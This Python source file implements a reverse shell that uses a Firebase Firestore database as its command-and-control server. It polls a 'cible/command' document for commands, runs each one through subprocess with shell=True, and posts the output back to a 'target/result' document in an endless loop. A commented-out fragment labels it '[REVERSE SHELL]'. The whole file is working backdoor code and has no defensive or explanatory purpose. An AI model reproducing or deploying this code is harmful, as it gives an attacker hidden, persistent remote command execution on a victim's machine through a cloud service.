import subprocess
import time
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore


class Shell:
    def __init__(self):
        self.cred = credentials.Certificate(
            "DatabaseShell\serviceAccountKey.json")
        firebase_admin.initialize_app(self.cred)
        self.db = firestore.client()

    def recvData(self):
        time.sleep(10)
        cmd = self.db.collection("cible").document(
            "command").get()
        result = cmd.to_dict()
        return f"{result['request']}"

    def exec(self):
        tsk = subprocess.Popen(args=self.recvData(), shell=True, stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        stdout, stderr = tsk.communicate()
        result = stdout.decode('utf8')
        return result

    def sendData(self):
        self.db.collection("target").document(
            "result").set({"response": f"{self.exec()}"})

    def main(self):
        self.sendData()
        print("[+] COMMANDE SEND[+]")
        time.sleep(5)
        self.main()


Shell().main()

# if msg[:2] == 'cd':
#     os.chdir(msg[3:])
#     self.send_msg("[REVERSE SHELL] * Changed Dir *")
# elif msg[:4] == 'exit':
#     self.fire_init()
# else:
#     self.send_msg(result)
